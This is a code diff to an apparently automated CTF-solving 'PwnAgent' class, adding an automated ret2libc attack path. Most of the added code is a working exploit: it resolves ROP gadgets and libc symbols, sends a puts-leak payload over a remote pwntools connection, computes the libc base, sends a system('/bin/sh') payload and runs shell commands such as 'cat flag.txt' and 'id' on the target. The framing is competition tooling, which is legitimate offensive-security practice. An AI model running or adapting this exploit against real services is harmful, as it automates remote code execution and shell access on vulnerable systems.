@@ -60,7 +60,7 @@ class PwnAgent(BaseAgent):
         pwn_tool: Optional[PwntoolsWrapper] = None,
     ) -> None:
         super().__init__(agent_id, AgentType.SPECIALIST)
-        self.reasoner = reasoner or LLMReasoner()
+        self.reasoner = reasoner
         self.pwn_tool = pwn_tool or PwntoolsWrapper()
         self.capabilities = [
             "symbolic_execution",
@@ -134,6 +134,18 @@ class PwnAgent(BaseAgent):
         if handled:
             return self._result(challenge, "attempted", steps)
 
+        # Fast path — no PIE + bundled libc + remote target is usually ret2libc.
+        ret2libc_steps, flag_str = self._phase_ret2libc(binary, files, challenge)
+        steps.extend(ret2libc_steps)
+        if flag_str:
+            return self._result(challenge, "solved", steps, flag=flag_str)
+        if self._ret2libc_attempted(ret2libc_steps):
+            steps.append(
+                "ret2libc attempted but did not recover a flag; stopping before "
+                "slow generic Ghidra/angr/LLM fallbacks."
+            )
+            return self._result(challenge, "attempted", steps)
+
         # Phase 2 — Ghidra static analysis
         ghidra_steps, ghidra_functions = self._phase_ghidra(binary)
         steps.extend(ghidra_steps)
@@ -150,7 +162,7 @@ class PwnAgent(BaseAgent):
                 return self._result(challenge, "solved", steps, flag=flag_str)
 
             # Phase 3c — send angr payload to remote if available
-            conn_info = challenge.get("connection_info")
+            conn_info = self._extract_connection_info(challenge)
             if conn_info:
                 remote_steps, flag_str = self._send_payload_remote(conn_info, payload)
                 steps.extend(remote_steps)
@@ -334,11 +346,18 @@ class PwnAgent(BaseAgent):
         self, binary: str, challenge: Dict[str, Any]
     ) -> List[str]:
         steps: List[str] = []
-        conn_info = challenge.get("connection_info")
+        conn_info = self._extract_connection_info(challenge)
         self.pwn_tool.generate_template(binary, conn_info)
         steps.append("Generated pwntools exploit template")
 
-        if self.reasoner.is_available:
+        if os.getenv("CTF_AGENTS_ENABLE_PWN_LLM_FALLBACK") != "1":
+            steps.append("Skipping pwn LLM fallback by default; set CTF_AGENTS_ENABLE_PWN_LLM_FALLBACK=1 to enable.")
+            return steps
+
+        if self.reasoner is None:
+            self.reasoner = LLMReasoner()
+
+        if getattr(self.reasoner, "is_available", False):
             steps.append("Requesting exploit strategy from LLM...")
             prompt = (
                 f"Provide a brief exploit strategy for this binary challenge.\n"
@@ -353,6 +372,283 @@ class PwnAgent(BaseAgent):
                 steps.append(f"LLM unavailable: {exc}")
 
         return steps
+
+    # ------------------------------------------------------------------
+    # ret2libc helpers
+    # ------------------------------------------------------------------
+
+    def _phase_ret2libc(
+        self,
+        binary: str,
+        files: List[str],
+        challenge: Dict[str, Any],
+    ) -> tuple[List[str], Optional[str]]:
+        steps: List[str] = []
+        conn_info = self._extract_connection_info(challenge)
+        libc_path = self._find_libc_file(files, binary)
+
+        if not conn_info or not libc_path:
+            return steps, None
+
+        steps.append("Attempting ret2libc exploitation with bundled libc...")
+        if self._is_pie(binary):
+            steps.append("ret2libc: PIE enabled — static PLT/GOT gadgets unreliable; skipping")
+            return steps, None
+
+        context = self._build_ret2libc_context(binary, libc_path, steps)
+        if context is None:
+            return steps, None
+
+        offsets = self._candidate_overflow_offsets(binary, steps)
+        for offset in offsets:
+            ret_steps, flag = self._try_ret2libc_at_offset(conn_info, offset, context)
+            steps.extend(ret_steps)
+            if flag:
+                return steps, flag
+
+        return steps, None
+
+    @staticmethod
+    def _ret2libc_attempted(steps: List[str]) -> bool:
+        return any(step.startswith("ret2libc: trying remote leak") for step in steps)
+
+    @staticmethod
+    def _find_libc_file(files: List[str], binary: str) -> Optional[str]:
+        candidates = [str(path) for path in files]
+        binary_dir = os.path.dirname(os.path.abspath(binary))
+        candidates.extend([
+            os.path.join(binary_dir, "libc.so.6"),
+            os.path.join(binary_dir, "libc.so"),
+        ])
+
+        for path in candidates:
+            name = os.path.basename(path).lower()
+            if name.startswith("libc") and os.path.exists(path):
+                return path
+        return None
+
+    def _build_ret2libc_context(
+        self,
+        binary: str,
+        libc_path: str,
+        steps: List[str],
+    ) -> Optional[Dict[str, int]]:
+        try:
+            import pwn  # type: ignore
+            pwn.context.clear(arch="amd64", os="linux")
+            pwn.context.log_level = "error"
+            elf = pwn.ELF(binary, checksec=False)
+            libc = pwn.ELF(libc_path, checksec=False)
+        except Exception as exc:
+            steps.append(f"ret2libc: pwntools ELF analysis unavailable: {exc}")
+            return None
+
+        try:
+            rop = pwn.ROP(elf)
+            pop_rdi = int(rop.find_gadget(["pop rdi", "ret"]).address)
+        except Exception:
+            pop_rdi = self._find_pop_rdi_gadget(binary) or 0
+
+        ret_gadget = self._find_ret_gadget(binary) or 0
+        puts_plt = int((elf.plt or {}).get("puts") or 0)
+        puts_got = int((elf.got or {}).get("puts") or 0)
+        main_addr = int((elf.symbols or {}).get("main") or 0)
+        libc_puts = int((libc.symbols or {}).get("puts") or 0)
+        libc_system = int((libc.symbols or {}).get("system") or 0)
+        try:
+            libc_binsh = int(next(libc.search(b"/bin/sh")))
+        except Exception:
+            libc_binsh = 0
+
+        missing = [
+            name
+            for name, value in {
+                "pop rdi; ret": pop_rdi,
+                "puts@plt": puts_plt,
+                "puts@got": puts_got,
+                "main": main_addr,
+                "libc puts": libc_puts,
+                "libc system": libc_system,
+                "libc /bin/sh": libc_binsh,
+            }.items()
+            if not value
+        ]
+        if missing:
+            steps.append(f"ret2libc: missing required symbol/gadget(s): {', '.join(missing)}")
+            return None
+
+        steps.append(
+            "ret2libc: resolved puts@plt, puts@got, main, pop rdi gadget, "
+            "system, and /bin/sh."
+        )
+        return {
+            "pop_rdi": pop_rdi,
+            "ret": ret_gadget,
+            "puts_plt": puts_plt,
+            "puts_got": puts_got,
+            "main": main_addr,
+            "libc_puts": libc_puts,
+            "libc_system": libc_system,
+            "libc_binsh": libc_binsh,
+        }
+
+    def _candidate_overflow_offsets(self, binary: str, steps: List[str]) -> List[int]:
+        detected = self._find_overflow_offset(binary, steps)
+        candidates = [40, 56, 72, 88, 104, 120, 136, 152, 168, 200, 256]
+        if detected is not None:
+            candidates.insert(0, detected)
+
+        out: List[int] = []
+        for value in candidates:
+            if value not in out:
+                out.append(value)
+        return out
+
+    def _try_ret2libc_at_offset(
+        self,
+        conn_info: str,
+        offset: int,
+        context: Dict[str, int],
+    ) -> tuple[List[str], Optional[str]]:
+        steps: List[str] = []
+        parsed = self._parse_host_port(conn_info)
+        if parsed is None:
+            steps.append(f"ret2libc: could not parse connection_info: {conn_info!r}")
+            return steps, None
+        host, port = parsed
+
+        steps.append(f"ret2libc: trying remote leak with offset={offset} against {host}:{port}")
+        try:
+            import pwn  # type: ignore
+            pwn.context.clear(arch="amd64", os="linux")
+            pwn.context.log_level = "error"
+            io = pwn.remote(host, port, timeout=8)
+        except ImportError:
+            steps.append("ret2libc: pwntools not installed; cannot connect to remote")
+            return steps, None
+        except Exception as exc:
+            steps.append(f"ret2libc: remote connection failed: {exc}")
+            return steps, None
+
+        try:
+            leak_payload = self._ret2libc_leak_payload(offset, context)
+            self._send_menu_or_raw_payload(io, leak_payload)
+            leak_output = io.recvuntil(b"Welcome", timeout=4)
+            leaked_puts = self._parse_ret2libc_leak(leak_output, context["pop_rdi"])
+            if not leaked_puts:
+                steps.append("ret2libc: could not parse puts leak from remote output")
+                io.close()
+                return steps, None
+
+            libc_base = leaked_puts - context["libc_puts"]
+            steps.append(f"ret2libc: leaked puts=0x{leaked_puts:x}; libc base=0x{libc_base:x}")
+
+            system = libc_base + context["libc_system"]
+            binsh = libc_base + context["libc_binsh"]
+            shell_payload = self._ret2libc_shell_payload(offset, context, system, binsh)
+            self._send_menu_or_raw_payload(io, shell_payload)
+            time.sleep(0.25)
+
+            output = b""
+            for command in (b"cat flag.txt", b"cat /flag.txt", b"cat flag", b"id"):
+                io.sendline(command)
+                time.sleep(0.25)
+                try:
+                    output += io.recvrepeat(timeout=1)
+                except Exception:
+                    pass
+                flag = find_first_flag(output.decode("utf-8", errors="replace"))
+                if flag:
+                    preview = output[:300].decode("utf-8", errors="replace").replace("\n", " ")
+                    steps.append(f"ret2libc: shell output: {preview!r}")
+                    steps.append(f"Flag found via ret2libc: {flag}")
+                    return steps, flag
+
+            preview = output[:300].decode("utf-8", errors="replace").replace("\n", " ")
+            steps.append(f"ret2libc: no flag in shell output: {preview!r}")
+        except Exception as exc:
+            steps.append(f"ret2libc: exploit failed at offset {offset}: {exc}")
+        finally:
+            try:
+                io.close()
+            except Exception:
+                pass
+
+        return steps, None
+
+    @staticmethod
+    def _ret2libc_leak_payload(offset: int, context: Dict[str, int]) -> bytes:
+        return (
+            b"A" * offset
+            + struct.pack("<Q", context["pop_rdi"])
+            + struct.pack("<Q", context["puts_got"])
+            + struct.pack("<Q", context["puts_plt"])
+            + struct.pack("<Q", context["main"])
+        )
+
+    @staticmethod
+    def _ret2libc_shell_payload(
+        offset: int,
+        context: Dict[str, int],
+        system: int,
+        binsh: int,
+    ) -> bytes:
+        payload = b"A" * offset
+        if context.get("ret"):
+            payload += struct.pack("<Q", context["ret"])
+        payload += (
+            struct.pack("<Q", context["pop_rdi"])
+            + struct.pack("<Q", binsh)
+            + struct.pack("<Q", system)
+        )
+        return payload
+
+    @staticmethod
+    def _parse_ret2libc_leak(output: bytes, pop_rdi: int) -> Optional[int]:
+        marker = struct.pack("<Q", pop_rdi).rstrip(b"\x00")
+        for line in output.splitlines():
+            if b"Enjoy your " not in line:
+                continue
+            leak_line = line.split(b"Enjoy your ", 1)[1]
+            if marker and marker in leak_line:
+                leak_line = leak_line.split(marker, 1)[1]
+            leak = leak_line[-6:]
+            if len(leak) >= 4:
+                value = struct.unpack("<Q", leak.ljust(8, b"\x00"))[0]
+                if value > 0x100000000000:
+                    return value
+        return None
+
+    @staticmethod
+    def _send_menu_or_raw_payload(io: Any, payload: bytes) -> None:
+        transcript = b""
+        try:
+            transcript += io.recvrepeat(timeout=0.5)
+        except Exception:
+            pass
+
+        if any(token in transcript for token in (b"Fill my dish", b"Drink something", b"What would you like")):
+            io.sendline(b"1")
+            try:
+                io.recvuntil(b">", timeout=2)
+            except Exception:
+                pass
+
+        io.sendline(payload)
+
+    def _find_pop_rdi_gadget(self, binary: str) -> Optional[int]:
+        try:
+            r = subprocess.run(
+                ["ROPgadget", "--binary", binary, "--only", "pop|ret"],
+                capture_output=True, text=True, timeout=15,
+            )
+            for line in r.stdout.splitlines():
+                if " : pop rdi ; ret" in line:
+                    addr_str = line.split(" : ")[0].strip()
+                    return int(addr_str, 16)
+        except Exception:
+            pass
+        return None
 
     def _phase_source_guided_shellcode(
         self,
@@ -539,7 +835,7 @@ class PwnAgent(BaseAgent):
             steps.append("ret2win: no win-like function found")
             return steps, None
 
-        conn_info = challenge.get("connection_info")
+        conn_info = self._extract_connection_info(challenge)
         offset = self._find_overflow_offset(binary, steps)
 
         if offset is not None:
